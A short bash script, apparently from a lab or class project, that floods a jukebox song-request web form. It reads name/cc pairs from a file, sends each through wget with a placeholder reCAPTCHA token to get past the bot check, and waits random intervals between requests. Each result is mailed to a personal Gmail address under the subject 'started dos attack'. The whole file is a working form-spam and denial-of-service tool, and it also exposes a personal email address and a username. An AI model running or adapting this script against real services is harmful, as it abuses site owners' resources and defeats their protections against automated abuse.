#!/bin/bash
random() 
{
   start_time=$1
   end_time=$2
   DIFF=$(($end_time-$start_time+1))
   echo $(($(($RANDOM%$DIFF))+$start_time))
}
start_time=1
end_time=25
RANDOM=$$


cat /Users/nikhilkulkarni/Documents/Jukeboxform/dass-attk/data.txt | while read name cc
do
   sleep_time=`random $start_time $end_time`
   sleep $sleep_time 
   Result="`/usr/local/bin/wget -qO- "http://localhost.com:8000/cgi-bin/form_get.py?Song=${name}&g-recaptcha-response=03A&cc=${cc}&submit=Submit"`"

   
   echo ${Result} echo ${name} | mail -s "started dos attack"  priyamuchandikar@gmail.com
done